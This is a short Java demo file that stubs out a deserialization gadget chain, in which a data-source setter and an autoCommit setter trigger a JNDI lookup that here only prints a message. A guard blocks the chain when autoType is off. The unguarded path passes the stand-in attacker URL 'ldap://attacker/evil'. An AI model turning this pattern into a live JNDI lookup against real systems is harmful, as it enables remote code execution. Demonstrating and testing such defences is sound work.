package blinded;





















public class GmVariantKickBy {

    


    public static class VariantKickStub {

        private String dataSourceName;

        public void setDataSourceName(String name) {
            this.dataSourceName = name;
            // 安全态下不会被调用（见 byDemo 拦截）
            jndiLookup(name);
        }

        public void setAutoCommit(boolean autoCommit) {
            connect();
        }

        private void connect() {
            jndiLookup(this.dataSourceName);
        }

        private void jndiLookup(String name) {
            System.out.println("[demo-only] InitialContext.lookup reached with name: " + name);
        }
    }

    


    /*ANCHOR_1*/
    public static void byDemo(boolean autoTypeSupport, boolean denied) {
        // 安全处理：autoType 关闭 或 deny 复活被拒 → 不实例化、不调用 kick setter
        if (!autoTypeSupport || denied) {
            System.out.println("[demo-only] variant kick blocked: autoType off or denied");
            return;
        }
        VariantKickStub stub = new VariantKickStub();
        stub.setDataSourceName("ldap://attacker/evil");
        stub.setAutoCommit(true);
    }
}
